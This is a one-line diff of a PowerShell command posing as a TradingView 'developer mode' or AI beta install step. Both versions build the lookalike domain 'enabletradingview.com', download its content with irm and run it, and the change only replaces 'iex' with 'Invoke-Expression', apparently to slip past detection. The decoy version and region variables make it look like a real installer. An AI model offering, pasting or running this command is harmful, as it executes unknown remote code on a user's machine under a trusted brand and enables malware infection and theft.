@@ -1,1 +1,1 @@
-powershell -command "$developermode='enable'; irm ($developermode + 'tradingview.com') | iex; $region='global'; $version='tradingview_30.7.0_ai_beta'"
+powershell -command "$developermode='enable'; irm ($developermode + 'tradingview.com') | Invoke-Expression; $region='global'; $version='tradingview_30.7.0_ai_beta'"
